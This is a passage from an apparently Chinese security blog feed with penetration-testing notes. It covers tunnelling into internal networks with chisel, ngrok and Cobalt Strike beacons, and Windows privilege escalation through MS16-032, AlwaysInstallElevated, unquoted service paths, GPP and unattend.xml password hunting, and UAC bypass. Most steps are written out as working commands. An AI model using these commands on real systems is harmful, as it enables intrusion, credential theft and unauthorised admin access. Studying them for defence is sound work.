class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chisel client 192.168.43.215:12345 socks<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160637238.png" alt="image-20240107160637238">在跳板机上执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chisel.exe server -p 12345<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160646554.png" alt="image-20240107160646554"></p><p>（2）反向连接<br>在攻击机上执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chisel.exe server -p 12345 --reverse<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160657134.png" alt="image-20240107160657134">在跳板机上执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chisel.exe client 192.168.43.234:12345 R:socks<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160711146.png" alt="image-20240107160711146"></p><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160720246.png" alt="image-20240107160720246"><br>在攻击上访问内网主机：<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160731325.png" alt="image-20240107160731325"></p><ul><li><p><strong>ngrok</strong><br>  ngrok 是一个反向代理，通过在公共端点和本地运行的 Web 服务器之间建立一个安全的通道，实现内网主机的服务可以暴露给外网。ngrok 可捕获和分析所有通道上的流量，便于后期分析和重放，所以ngrok可以很方便地协助服务端程序测试<br>  特点<br>  官方维护，一般较为稳定</p><p>  跨平台，闭源</p><p>  有流量记录和重发功能</p></li></ul><p>进入ngrok官网（<a href="https://ngrok.com/%EF%BC%89%EF%BC%8C%E6%B3%A8%E5%86%8Cngrok%E8%B4%A6%E5%8F%B7">https://ngrok.com/），注册ngrok账号</a><br>创建隧道，如下<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160740416.png" alt="image-20240107160740416"><br>将3389端口代理出来<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160749372.png" alt="image-20240107160749372"></p><p>下载客户端<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160756679.png" alt="image-20240107160756679"></p><p>在目标机上运行客户端<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160804874.png" alt="image-20240107160804874"><br>输入这里的id<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160812180.png" alt="image-20240107160812180"><br>成功<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160821638.png" alt="image-20240107160821638"></p><ul><li><p><strong>smb beacon上线</strong><br>官网介绍：SMB Beacon使用命名管道通过父级Beacon进行通讯，当两个Beacons连接后，子Beacon从父Beacon获取到任务并发送。<br>因为连接的Beacons使用Windows命名管道进行通信，此流量封装在SMB协议中，所以SMB Beacon相对隐蔽，绕防火墙时可能发挥奇效</p><p> <strong>这种Beacon要求具有SMB Beacon的主机必须接受端口445上的连接。</strong><br> 派生一个SMB Beacon方法：在Listner生成SMB Beacon&gt;目标主机&gt;右键&gt; spawn &gt;选中对应的Listener&gt;上线<br> 或在Beacon中使用命令spawn smb（smb为我的smb listener名字)<br> <img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160846690.png" alt="image-20240107160846690"></p></li></ul><p>使用插件，或自带端口扫描，扫描内网机器<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160854918.png" alt="image-20240107160854918"><br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160901991.png" alt="image-20240107160901991">转到视图，选择目标<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160910125.png" alt="image-20240107160910125">在之前我们要先抓一波密码</p><p>运行成功后外部可以看到∞∞这个字符，这就是派生的SMB Beacon。<br>当前是连接状态，你可以Beacon上用link <ip>命令链接它或者unlink <ip>命令断开它</ip></ip></p><ul><li><p><strong>中转listener(Reverse TCP Beacon)</strong><br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160917615.png" alt="image-20240107160917615">然后和上面差不多</p></li><li><p><strong>tcp beacon正向</strong><br>SMB Beacon，TCP Beacon 与 Cobalt Strike 中派生 payload 的大多数动作相兼容。除了一些 要求显式 stager 的用户驱动的攻击（比如：Attacks → Packages 、 Attacks → Web Drive-by ）<br>生成listener<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160926387.png" alt="image-20240107160926387">在中转机器的Beacon里使用connect [ip address] [port]命令进行正向连接，即可上线<img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160937286.png" alt="image-20240107160937286"></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网穿透</tag>
      
      <tag>内网渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网权限提升</title>
    <link href="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
    <url>/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在windows中，权限大概分为四种，分别是User,Administrator,System,TrustedInstaller。<br>其中前三种是我们接触的最多的。</p><ul><li><strong>纵向提权</strong><br>低权限角色获得高权限角色的权限。</li><li><strong>横向提权</strong><br>获取同级别角色的权限。</li></ul><p>常见的提权方法有系统内核溢出提权，数据库提权，错误的系统配置提权，组策略首选项提权，WEB中间件漏洞提权，DLL劫持提权，溢出高权限令牌提权，第三方软件&#x2F;服务提权等。</p><h2 id="补丁信息"><a href="#补丁信息" class="headerlink" title="补丁信息"></a>补丁信息</h2><ul><li><strong>手动查看</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">systeminfo<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161209098.png" alt="image-20240107161209098"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wmic qfe get Caption,Description,HotFixID,InstalledOn<br></code></pre></td></tr></table></figure><p>列出已安装补丁<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161215899.png" alt="image-20240107161215899">如果目标机存在ms16-032(KB3139914)漏洞，不仅可以利用metasploit进行提权，还能够用invoke-ms16-032.ps1脚本进行提权。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">import-module Invoke-MS16-032.ps1<br>Invoke-MS16-032 -Application cmd.exe -Commandline <span class="hljs-string">&quot;/c net user test2 123.com /add&quot;</span><br></code></pre></td></tr></table></figure><ul><li><strong>利用Metasploit发现缺失补丁</strong><br>利用 post&#x2F;windows&#x2F;gather&#x2F;enum_patches 模块<br>可以根据漏洞编号快速找出系统中缺少的补丁。<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161225855.png" alt="image-20240107161225855"><br>metasploit还内置了 local_exploit_suggester模块，这个模块用于快速识别系统中可能被利用的漏洞。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">use post/multi/recon/local_exploit_suggester<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161234606.png" alt="image-20240107161234606"></p><ul><li><strong>Powershell中的Sherlock脚本</strong><br>用于快速查找可能用于本地提权的漏洞</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Import-Module .\Sherlock.ps1<br>Find-AllVulns<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161243584.png" alt="image-20240107161243584"></p><p>项目地址：<a href="https://github.com/rasta-mouse/Sherlock">https://github.com/rasta-mouse/Sherlock</a></p><ul><li><h6 id="Windows-Exploit-Suggester"><a href="#Windows-Exploit-Suggester" class="headerlink" title="Windows Exploit Suggester"></a>Windows Exploit Suggester</h6><p>将systeminfo信息输出到txt文件中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">systeminfo &gt; info.txt<br></code></pre></td></tr></table></figure><p>windows-exploit-suggester下载地址：<a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggeste">https://github.com/AonCyberLabs/Windows-Exploit-Suggeste</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">./windows-exploit-suggester.py --update<br>pip install xlrd --upgrade<br>/windows-exploit-suggester.py -d BulletinSearch.xlsx -i info.txt<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240108110957700.png" alt="image-20240108110957700"></p></li></ul><h2 id="Windows操作系统配置错误利用分析及防范"><a href="#Windows操作系统配置错误利用分析及防范" class="headerlink" title="Windows操作系统配置错误利用分析及防范"></a>Windows操作系统配置错误利用分析及防范</h2><p>在Windows系统中，攻击者通常会通过系统内核溢出漏洞来提权，但如果碰到无法通过内核溢出漏洞提权所在服务器权限的情况，就会利用系统中的配置错误来提权，Windows操作系统的常见配置错误包括管理员凭据配置错误，服务配置错误，故意消弱的安全措施，用户权限过高等。</p><ul><li><strong>PowerUP下的实战利用</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Import-Module .\PowerUp.ps1<br>Invoke-AllChecks<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161251489.png" alt="image-20240107161251489"></p><ul><li><strong>Metasploit下的实战</strong><br>在metasploit中对应的模块是service_permissions，选择“AGGRESSIVE”选项，可以利用目标机器上每一个有缺陷的服务，该选项被禁用时，该模块在第一次提权成功后就会停止工作。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">use windows/local/service_permissions<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161301568.png" alt="image-20240107161301568"></p><p>如果有成功利用的会自动反弹一个meterpreter(system权限)</p><ul><li><strong>注册表键 AlwayslnstallElevated</strong><br>注册表键AlwayslnstallElevated是一个策略设置项，Windows允许低权限用户以System权限运行安装文件。如果启用此策略选项，那么任何权限的用户都能以System来安装恶意的MSI文件。</li></ul><p>该漏洞产生的原因是用户开启了Windows Install特权安装功能。</p><p>利用powerup.ps1个Get-Registry AlwaysInstallElevated特权来检查注册表键是否被设置。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Import-Module PowerUp.ps1<br>Get-RegistryAlwaysInstallElevated<br></code></pre></td></tr></table></figure><p>、<img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161310254.png" alt="image-20240107161310254">接下来，添加账号，运行Write-UserAddMSI模块，生成MSI文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Write-UserAddMSI<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161320295.png" alt="image-20240107161320295"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msiexec /q  /i UserAdd.msi<br></code></pre></td></tr></table></figure><p>这时，以普通权限运行UserAdd.msi，就会添加一个管理员账户。</p><h2 id="可信任服务路径漏洞"><a href="#可信任服务路径漏洞" class="headerlink" title="可信任服务路径漏洞"></a>可信任服务路径漏洞</h2><p>如果一个服务调用的可执行文件没有正确处理所引用的完整路径名，这个漏洞就会被攻击者用来上传任意可执行文件。也就是说，如果一个服务的可执行文件的路径没有被双引号引起来且包含空格，那么这个服务就存在漏洞。<br>该漏洞存在有如下两种可能</p><ol><li>如果路径与服务有关，就任意创建一个服务或者编译Service模板</li><li>.如果路径与可执行文件有关，就任意创建一个可执行文件。</li></ol><ul><li><p><strong>Trusted Service Paths 漏洞产生的原因</strong><br>因为windows服务通常都是以System权限运行的，所有系统在解析服务所对应的文件路径中的空格时，也会以系统权限进行。<br>比如，有一个文件路径”C:\Program Files\Some Folder\Service.exe”,对于该路径中的每一个空格，Windows都会尝试寻找与空格前面的名字相匹配的程序。操作系统会对文件路径中空格所有可能情况进行尝试，直到找到能匹配的程序。<br>会尝试：<br>1.C:\Program.exe<br>2.C:\Program Files\Some.exe<br>3.C:\Program Files\Some Folder\Service.exe<br>因此，如果一个被“适当”命名的可执行程序被上传到受影响的目录中，服务一旦重启，该程序就会以System权限运行（大多数情况下）</p></li><li><p><strong>实战</strong><br>首先检查目标机器中是否存在该漏洞，使用wmic查询命令：</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wmic service get name,displayname,pathname,startmode | findstr /i <span class="hljs-string">&quot;Auto&quot;</span> | findstr /i /V <span class="hljs-string">&quot;C:\Windows\\&quot;</span> | findstr /i /V <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161330160.png" alt="image-20240107161330160"><br>接下来检查对目标文件夹的写权限。在这里使用Windows的内置工具icacls，依次检测目录的权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">icacls <span class="hljs-string">&quot;C:\Program Files (x86)\Common Files&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161338218.png" alt="image-20240107161338218"><br>要是其中目录后又”Everyone:(OI)(CI)(F)”字样</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">Everyone:用户对这个文件夹有完全控制权限。也就是说，所有用户具有修改这个文件夹的权限。<br>(M):修改<br>(f):修改<br>(CI):从属容器将继续访问控制项<br>(OI):从属文件将继续访问控制项<br>Everyone:(OI)(CI)(F)表示对该文件夹，用户有读写，删除其下文件，删除其子目录的权限<br></code></pre></td></tr></table></figure><p>确认此漏洞后，把要上传的程序重命名并放置在存漏洞且可写的目录下，执行如下命令，尝试重启服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sc stop service_name<br>sc start service_name<br></code></pre></td></tr></table></figure><p>也可以使用msf中的Windows Service Trusted Path Privilege Escalation模块进行渗透测试。该模块将可执行程序放到受影响的文件夹中，然后将受影响的服务重启。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">对trusted_service_path  模块进行参数设置<br></code></pre></td></tr></table></figure><p>命令执行后，会自动反弹shell，但shell会很快中断，这是因为当以进程在windows操作系统中启动后，必须与服务控制管理器进行通信，如果没有通信，服务控制管理器会认为出现了错误，进而终止这个进程。所以在终止载荷进程之前将它迁移到其他进程中（可使用”set AutoRunScript migrate -f”命令自动迁移进程)<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161348471.png" alt="image-20240107161348471"></p><ul><li><strong>自动安装配置文件</strong><br>网络管理员在内网中给多态机器配置同一个环境时，通常不会逐台配置，而会使用脚本化批量部署的方式。在这一过程中，会使用安装配置文件。这些配置文件中包含所有的安装配置信息，其中的一些还有可能包含本地管理员账号和密码等信息。这些文件如下：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">C:\sysprep.inf<br>c:\sysprep\sysprep.xml<br>c:\windows\system32\sysprep.inf<br>c:\windows\system32\sysprep\sysprep.xml<br>c:\unattend.xml<br>c:\Windows\Panther\Unattend.xml<br>c:\Windows\Panther\Unattended.xml<br>c:\Windows\Panther\Unattend\Unattended.xml<br>c:\Windows\Panther\Unattend\Unattend.xml<br>c:\windows\system32\sysprep\Unattend.xml<br>c:\windows\system32\sysprep\Panther\Unattend.xml<br></code></pre></td></tr></table></figure><p>可以直接输入如下命令搜索Unattend.xml文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">dir</span> /b /s c:\Unattend.xml<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161356728.png" alt="image-20240107161356728"></p><p>msf中也集成了该模块</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">post/windows/gather/enum_unattend<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161405788.png" alt="image-20240107161405788"></p><ul><li><strong>计划任务</strong><br>可以使用如下命令查看计算机的计划任务</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">schtasks /query /fo LIST /v<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161415095.png" alt="image-20240107161415095"><br>AccessChk用于在Windows中进行一些系统或程序的高级查询，管理和故障排除工资。<br>下载地址：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/accesschk">https://docs.microsoft.com/zh-cn/sysinternals/downloads/accesschk</a></p><p>执行如下命令，查看指定目录的权限配置情况。如果攻击者对以高权限运行的任务所在的目录具有写权限，就可以使用恶意程序覆盖原来的程序。这样计划任务下次执行时，就会以高权限来运行恶意程序。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">accesschk.exe -dqv <span class="hljs-string">&quot;c:\Microsoft&quot;</span> -accepteula<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161424894.png" alt="image-20240107161424894"><br>常用的AccessChk命名<br>第一次运行时会弹出一个许可证协议对话框。这里，可以使用参数 &#x2F;accepteula 自动接受许可证协议</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">accesschk.exe /accepteula<br></code></pre></td></tr></table></figure><p>Accesschk可以自动的检查当我们使用一个特定的用户时，我们是否对Windows的某个服务有写的权限。当我们作为一个低权限用户，我们首先就想要看一下“Authenticated Users”组对这些服务的权限。</p><p>找出某个驱动器下所有权限配置有缺陷的文件夹路径</p><p>accesschk.exe -uwdqs Users c:\<br>accesschk.exe -uwdqs “Authenticated Users” c:\<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161433527.png" alt="image-20240107161433527">找出某个驱动器下所有权限配置有缺陷的文件</p><p>accesschk.exe -uwqs Users c:*.*<br>accesschk.exe -uwqs “Authenticated Users” c:*.*</p><h2 id="组策略首选项提权"><a href="#组策略首选项提权" class="headerlink" title="组策略首选项提权"></a>组策略首选项提权</h2><p>参考：<a href="https://www.cnblogs.com/Yang34/p/12492270.html">https://www.cnblogs.com/Yang34/p/12492270.html</a></p><p>文件路径</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">C:\Windows\SYSVOL\domain\Policies\&#123;8C4C36A7-7BA1-4F33-B2F5-9ADD814299F3&#125;\Machine\Preferences\Groups<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161442320.png" alt="image-20240107161442320"><br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161451440.png" alt="image-20240107161451440">可以看到cpassword使用aes-256算法加密的。可以进行进行解密</p><p>在powersploit中提供了Get-GPPPassword.ps1脚本。将该脚本导入系统，获取组策略中的密码。<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161500233.png" alt="image-20240107161500233"><br>msf中也集成了此功能</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">use post/windows/gather/credentials/gpp<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161508569.png" alt="image-20240107161508569"><br>Empire查找cpassword，在Empire下执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">usemodule privesc/gpp<br></code></pre></td></tr></table></figure><ul><li><strong>绕UAC提权分析</strong><br>如果计算机的操作系统时windows vista或更高，在权限不够的情况下，访问系统磁盘的根目录，windows目录，Program Files目录，以及读，写系统登录数据库的程序等操作，都需要经过UAC（User Account Control,用户账户控制)的认证才能进行。<br>在msf中运行</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">exploit/windows/local/bypassuac<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161518473.png" alt="image-20240107161518473"><br>提权成功</p><ul><li><strong>RunAs模块</strong><br>使用</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">exploit/windows/local/ask<br></code></pre></td></tr></table></figure><p>创建一个可执行文件，目标机器会运行一个发起提权的请求程序，提示用户是否继续运行，如果用户选择继续运行程序，就会返回一个高权限的shell。</p><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161526950.png" alt="image-20240107161526950"></p><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161533649.png" alt="image-20240107161533649"><br>点击确定后再查看权限就是一个高权限了<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161540907.png" alt="image-20240107161540907"><br>要想使用RunAs模块进行提权，当前用户必须在管理员组中或者直到管理员的密码，对UAC的设置则没有要求，在使用RunAs模块时，需要使用EXE::Custom选项创建一个可执行文件（需进行免杀处理)</p><ul><li><strong>Empire 的bypassuac_wscript模块</strong><br>该模块的大致工作原理是，使用c:\windows\wscript.exe执行payload,即可绕过UAC，以管理员权限执行payload.该模块只适用于操作系统为windows7的机器，尚没有对应的补丁，部分杀毒软件会对该模块的运行进行提示。</li></ul><h2 id="令牌窃取"><a href="#令牌窃取" class="headerlink" 